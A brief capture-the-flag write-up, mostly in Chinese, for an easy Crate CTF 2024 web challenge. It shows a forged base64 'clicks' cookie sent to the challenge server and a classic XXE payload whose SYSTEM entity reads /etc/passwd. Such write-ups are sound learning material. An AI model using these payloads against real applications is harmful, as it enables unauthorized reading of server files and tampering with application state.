---
title: Crate CTF Writeup
contest: Crate CTF
year: 2024
difficulty: easy
vuln_type: xxe
tags: [web, xxe, base64, fetch, cookie, 简单]
attack_chain:
  - fetch POST flag.php with Cookie clicks=base64(1000000000)
  - XML payload: <!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd">]><data>&example;</data>
  - 服务端解析XML触发XXE读文件
key_payload: const clickCnt="1000000000"; headers={"Cookie":`clicks=${btoa(clickCnt)}`}
one_liner: Crate CTF web题，cookie爆破+XXE读文件
lesson: XXE经典payload：ENTITY SYSTEM + 任意文件路径
quality: low
---

# Crate CTF Writeup

## 题目信息
- 比赛：Crate CTF
- 类别：Web
- URL：`http://challs.crate.nu:50012/`

## 关键攻击链
1. **触发流程**：
   - `fetch("http://challs.crate.nu:50012/flag.php", {method: "POST", headers: {"Cookie": "clicks=base64(1000000000)"}})`
   - 需先点击 1,000,000,000 次（伪造 Cookie）
2. **XXE Payload**：
   ```xml
   <!DOCTYPE foo [
     <!ENTITY example SYSTEM "/etc/passwd">
   ]>
   <data>&example;</data>
   ```
3. 服务端 XML 解析时触发 SYSTEM 实体，读取本地文件

## 评分
- quality: low（仅 19 行，纯 payload + 简单解释）
